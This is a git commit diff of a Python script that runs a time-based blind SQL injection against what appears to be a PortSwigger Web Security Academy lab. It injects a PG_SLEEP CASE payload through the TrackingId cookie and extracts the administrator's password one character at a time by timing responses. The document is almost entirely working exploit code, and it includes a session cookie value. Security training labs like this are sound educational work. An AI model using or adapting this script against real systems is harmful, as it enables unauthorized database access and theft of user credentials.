c2cad84b95c9a58b2db628130b7c7903f7be3e71
humphreyspinto <humphreyspinto@gmail.com>
2019-10-19 20:14:09 +0300

    Done with time delay bsqli

--- sql_injection/sqllab3.py
+++ sql_injection/sqllab3.py
@@ -3,48 +3,30 @@
 import requests
 import time
 
-LAB_URL = 'ac541fd01f7f079b800b5d2a005a0091.web-security-academy.net'
+LAB_URL = 'https://acac1f5e1f49064680ca995400d80022.web-security-academy.net/'
 PASSWORD_LENGTH = 6
-WAIT_TIME = 5
+WAIT_TIME = '5'
 COUNT = 1
 password = ''
 
-_payload = lambda count, ch, operator: 'xyz\'%3BSELECT+CASE+WHEN+ \
-(username=\'administrator\'+AND+SUBTRING(password, 1,'+ COUNT +')'+operator+'\'' + ch + '\'' + ')+THEN+PG_SLEEP('+ WAIT_TIME + ')+ELSE+PG_SLEEP(0)+END--' 
+_payload = lambda count, ch, operator: 'xyz\'%3BSELECT+CASE+WHEN+\
+(username=\'administrator\'+AND+SUBSTRING(password, 1,'+ count +')'+operator+'\'' + ch + '\'' + ')+THEN+PG_SLEEP('+ WAIT_TIME + ')+ELSE+PG_SLEEP(0)+END+FROM+users--' 
 
-_headers = lambda payload: {'Cookie: TrackingId=' + payload + 'session='}
+_headers = lambda payload: {'Cookie': 'TrackingId=' + payload + 'session=wW5wFu4OjKSFwfNBnyRyewIdu8tCw5kM'}
 
 while COUNT <= PASSWORD_LENGTH:
-	first = 33
-	last = 126
-	mid = None
-
-	while first <= last and not found:
-		mid = (first + last)//2
-		payload_str = _payload(str(COUNT), chr(mid), '=')
-		#make request with payload and check delay
+	for c in range(33,127):
+		payload_str = _payload(str(COUNT), chr(c), '=')
 		print('[*]Sending request {}...'.format(payload_str))
-		t1 = time.perf_counter()
+		start = time.perf_counter()
 		res = requests.get(LAB_URL, headers=_headers(payload_str))
-		t2 = time.perf_counter()
-		
-		time_diff = t2 - t1
-		if time_diff == TIME_WAIT:
-			print('[*]Found character {} at position {}...'.format(chr(mid), COUNT))
-			password += chr(mid)
-			found = True
-		else:
-			payload_str = _payload(str(COUNT), chr(mid), '>')
-			print('[*]Sending request {}...'.format(payload_str))
-			t1 = time.perf_counter()
-			res = requests.get(LAB_URL, headers=_headers(payload_str))
-			t2 = time.perf_counter()
+		end = time.perf_counter()
 
-			time_diff = t2 - t1
-			if time_diff == TIME_WAIT:
-				first = mid + 1
-			else:
-				last = mid - 1
+		diff = end - start
+		print('time delay {}'.format(round(diff,1)))
+		if round(diff,1) > float(WAIT_TIME):
+			print('[*]Found character \'{}\' at position {}...'.format(chr(c), COUNT))
+			password += chr(c)
 	COUNT += 1
 
 print('-------------------------------------\n\n')
